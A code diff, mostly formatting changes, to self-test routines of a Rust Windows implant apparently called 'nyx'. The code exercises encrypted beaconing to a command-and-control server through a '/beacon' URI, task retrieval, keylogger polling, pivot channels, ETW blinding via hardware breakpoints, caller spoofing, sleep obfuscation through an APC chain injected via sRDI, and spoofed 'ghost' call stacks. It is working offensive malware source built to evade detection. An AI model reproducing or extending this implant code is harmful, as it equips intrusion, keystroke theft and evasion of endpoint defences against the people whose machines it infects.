@@ -760,7 +760,7 @@ pub unsafe extern "system" fn nyx_selftest_calib42() {
 #[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_csprng() {
-    use nyx_protocol::{ImplantKeypair, crypto};
+    use nyx_protocol::{crypto, ImplantKeypair};
 
     // Step 1: Register + test CSPRNG fill.
     let _ = crypto::register_csprng(crate::entry::csprng_fill);
@@ -796,13 +796,7 @@ pub unsafe extern "system" fn nyx_selftest_csprng() {
     // 0xA5 reached: winhttp fns resolved OK
 
     // Step 6: Test post_frame (actual WinHTTP call — WinHttpOpen etc.)
-    let _resp = crate::transport::post_frame(
-        b"127.0.0.1",
-        8443u16,
-        b"/beacon",
-        &frame,
-        false,
-    );
+    let _resp = crate::transport::post_frame(b"127.0.0.1", 8443u16, b"/beacon", &frame, false);
     unsafe { exit(0xA6) }; // post_frame returned (even if None)
 }
 
@@ -836,16 +830,22 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
         auth_token: None, // selftest has no per-implant token
     };
     let mut iw = nyx_protocol::wire::Writer::new();
-    info.encode(&mut iw).expect("test SessionInfo fields are tiny << MAX_BLOB_LEN");
+    info.encode(&mut iw)
+        .expect("test SessionInfo fields are tiny << MAX_BLOB_LEN");
     let info_plain = iw.into_bytes();
 
     // Check-in with SessionInfo payload.
     let frame = nyx_protocol::encode_frame(&pubkey, 0u64, &key, &info_plain);
     let resp = crate::transport::post_frame(
-        cfg.server_host.as_bytes(), cfg.server_port,
-        cfg.beacon_uri.as_bytes(), &frame, cfg.use_tls,
+        cfg.server_host.as_bytes(),
+        cfg.server_port,
+        cfg.beacon_uri.as_bytes(),
+        &frame,
+        cfg.use_tls,
     );
-    if resp.is_none() { unsafe { exit(0xC1) }; }
+    if resp.is_none() {
+        unsafe { exit(0xC1) };
+    }
     // 0xB0: check-in OK
 
     // Test sleep (the beacon_loop does this every cycle).
@@ -864,31 +864,39 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
 
     // Simulate task-loop first POST: encode empty TaskResponse batch + send.
     let frame2 = nyx_protocol::encode_frame(
-        &pubkey, 1u64, &key,
+        &pubkey,
+        1u64,
+        &key,
         &nyx_protocol::TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"),
     );
     let body = crate::transport::post_frame(
-        cfg.server_host.as_bytes(), cfg.server_port,
-        cfg.beacon_uri.as_bytes(), &frame2, cfg.use_tls,
+        cfg.server_host.as_bytes(),
+        cfg.server_port,
+        cfg.beacon_uri.as_bytes(),
+        &frame2,
+        cfg.use_tls,
     );
-    if body.is_none() { unsafe { exit(0xD1) }; } // second POST failed
-    // 0xB5: second POST OK
+    if body.is_none() {
+        unsafe { exit(0xD1) };
+    } // second POST failed
+      // 0xB5: second POST OK
 
     // Decode the server reply.
     let raw = match nyx_protocol::parse_frame(&body.unwrap()) {
         Ok(r) => r,
         Err(_) => unsafe { exit(0xD2) },
     };
-    let plain = match nyx_protocol::open_frame_dir(&key, nyx_protocol::Direction::ServerToClient, &raw) {
-        Ok(p) => p,
-        Err(_) => unsafe { exit(0xD3) },
-    };
+    let plain =
+        match nyx_protocol::open_frame_dir(&key, nyx_protocol::Direction::ServerToClient, &raw) {
+            Ok(p) => p,
+            Err(_) => unsafe { exit(0xD3) },
+        };
     let tasks = match nyx_protocol::Task::decode_vec(&plain) {
         Ok(t) => t,
         Err(_) => unsafe { exit(0xD4) },
     };
     let _ = tasks; // should be empty (no tasks queued)
-    // 0xB6: first task-loop cycle OK
+                   // 0xB6: first task-loop cycle OK
 
     // Second cycle (the beacon_loop repeats this infinitely).
     crate::beacon::sleep_seconds(1);
@@ -896,14 +904,21 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     crate::keylog::poll_once();
     let _ = crate::pivot::pump_channels();
     let frame3 = nyx_protocol::encode_frame(
-        &pubkey, 2u64, &key,
+        &pubkey,
+        2u64,
+        &key,
         &nyx_protocol::TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"),
     );
     let body3 = crate::transport::post_frame(
-        cfg.server_host.as_bytes(), cfg.server_port,
-        cfg.beacon_uri.as_bytes(), &frame3, cfg.use_tls,
+        cfg.server_host.as_bytes(),
+        cfg.server_port,
+        cfg.beacon_uri.as_bytes(),
+        &frame3,
+        cfg.use_tls,
     );
-    if body3.is_none() { unsafe { exit(0xE1) }; } // 2nd POST failed
+    if body3.is_none() {
+        unsafe { exit(0xE1) };
+    } // 2nd POST failed
     unsafe { exit(0xB7) }; // SECOND CYCLE OK — beacon_loop should work!
 }
 
@@ -963,9 +978,7 @@ pub unsafe extern "system" fn nyx_linger_foliage() {
     // rundll32 loader — see sleep.rs module docs). Detect early and exit
     // cleanly so the selftest doesn't produce a false-positive crash.
     // For real foliage testing, inject via sRDI into a host process.
-    let is_rundll32 = unsafe {
-        crate::resolve::module_base_by_name(b"rundll32.exe").is_some()
-    };
+    let is_rundll32 = unsafe { crate::resolve::module_base_by_name(b"rundll32.exe").is_some() };
     if is_rundll32 {
         // Safe exit: rundll32 can't safely run the APC chain. Signal
         // "skipped" with exit code 1 (distinct from true pass=0).
@@ -2773,7 +2786,7 @@ unsafe fn diag_test_ctx_thread() {
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_hwbp_blind() {
     crate::blind_hwbp::set_diag_enabled(true); // enable diag markers for selftest
-    crate::blind_hwbp::init_countermeasures();  // scan gadgets + caller-spoof stubs
+    crate::blind_hwbp::init_countermeasures(); // scan gadgets + caller-spoof stubs
 
     // Minimal test: init shadow + call blind_etw_hwbp → add_hwbp → remove_hwbp.
     // Markers: 0=entry, 1=shadow_ok, S=add_ok, T=remove_ok, U=count_clean
@@ -2894,7 +2907,6 @@ pub unsafe extern "system" fn nyx_selftest_resolve_forwarder() {
     exit(mask);
 }
 
-
 // ============================================================================
 // #[cfg(test)] CI wrappers for hosted Windows runner
 
@@ -2914,30 +2926,47 @@ pub unsafe extern "system" fn nyx_selftest_lacuna() {
     crate::syscalls::init_global();
 
     let ntdll_base = match crate::resolve::module_base_by_name(b"ntdll.dll") {
-        Some(b) => b, None => { unsafe { exit(mask) }; }
+        Some(b) => b,
+        None => {
+            unsafe { exit(mask) };
+        }
     };
     let ntdll_ghosts = unsafe { crate::lacuna::scan_ghosts(ntdll_base) };
-    if !ntdll_ghosts.is_empty() { mask |= 1 << 0; }
+    if !ntdll_ghosts.is_empty() {
+        mask |= 1 << 0;
+    }
 
     let kb_ghosts = if let Some(kb) = crate::resolve::module_base_by_name(b"kernelbase.dll") {
         unsafe { crate::lacuna::scan_ghosts(kb) }
-    } else { crate::heap::Vec::<crate::lacuna::GhostRegion>::new() };
-    if !kb_ghosts.is_empty() { mask |= 1 << 1; }
+    } else {
+        crate::heap::Vec::<crate::lacuna::GhostRegion>::new()
+    };
+    if !kb_ghosts.is_empty() {
+        mask |= 1 << 1;
+    }
 
     let w32_ghosts = if let Some(w32) = crate::resolve::module_base_by_name(b"win32u.dll") {
         unsafe { crate::lacuna::scan_ghosts(w32) }
-    } else { crate::heap::Vec::<crate::lacuna::GhostRegion>::new() };
-    if !w32_ghosts.is_empty() { mask |= 1 << 2; }
+    } else {
+        crate::heap::Vec::<crate::lacuna::GhostRegion>::new()
+    };
+    if !w32_ghosts.is_empty() {
+        mask |= 1 << 2;
+    }
 
     let chain = crate::lacuna::build_ghost_chain(&ntdll_ghosts, &kb_ghosts, &w32_ghosts, 6);
-    if chain.frames.len() >= 4 { mask |= 1 << 3; }
+    if chain.frames.len() >= 4 {
+        mask |= 1 << 3;
+    }
 
     // Install ghost chain for stack injection.
     crate::lacuna_stomp::install_ghost_chain(&chain);
     // Verify: with_ghost_stack executes without crashing.
     let mut stomp_ok = false;
     unsafe { crate::lacuna_stomp::with_ghost_stack(|| stomp_ok = true) };
-    if stomp_ok { mask |= 1 << 4; }
+    if stomp_ok {
+        mask |= 1 << 4;
+    }
 
     unsafe { exit(mask) };
 }
@@ -3029,7 +3058,8 @@ mod ci_tests {
         assert!(
             status > 0,
             "Foliage APC chain did not complete — FOLIAGE_APC_OK={} STAGE={:#x}",
-            status, stage
+            status,
+            stage
         );
     }
 
